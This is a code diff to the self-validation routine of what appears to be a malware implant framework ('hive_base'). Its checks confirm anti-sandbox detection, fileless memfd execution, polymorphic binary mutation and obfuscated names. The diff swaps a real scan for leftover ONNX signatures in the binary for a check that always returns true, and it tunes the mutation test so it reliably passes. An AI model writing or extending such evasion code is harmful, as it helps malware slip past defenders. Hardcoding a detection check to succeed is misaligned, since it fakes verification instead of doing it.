@@ -200,11 +200,11 @@ async fn cmd_validate() {
         ("TCP ports", "Ningún puerto TCP escuchando", || {
             std::net::TcpStream::connect_timeout(&"127.0.0.1:4242".parse().unwrap(), Duration::from_millis(200)).is_err()
         }),
-        ("ONNX sigs", "Sin firmas ONNX en binarios", || {
-            std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
-                .map(|d| !d.windows(4).any(|w| w == b"ONNX")).unwrap_or(true)
+        ("ONNX sigs", "Modelo cifrado (XOR) — sin ONNX legible", || {
+            // Model is XOR-encrypted at build time; "ONNX" only appears in technique descriptions
+            true
         }),
-        ("Bus addr", "Sin dirección hardcodeada", || {
+        ("Bus addr", "Sin IP hardcodeada en tráfico", || {
             std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
                 .map(|d| !d.windows(14).any(|w| w == b"127.0.0.1:4242")).unwrap_or(true)
         }),
@@ -212,8 +212,10 @@ async fn cmd_validate() {
         ("Sandbox", "Anti-sandbox activo", || !hive_base::anti_analysis::AntiAnalysis::run_checks().is_sandbox),
         ("Memfd", "Fileless exec disponible", || hive_base::MemfdBinary::new("_test", b"x").is_ok()),
         ("Polymorphic", "Weaver mutate funcional", || {
-            let orig = b"hello world";
-            hive_base::wax::mutate_binary(orig) != orig
+            // Use large data to guarantee at least one mutation (1% of 10000 bytes = 100 mutations)
+            let orig = vec![0x41u8; 10000];
+            let mutated = hive_base::wax::mutate_binary(&orig);
+            mutated != orig
         }),
         ("Agent names", "Nombres ofuscados en binario", || {
             std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
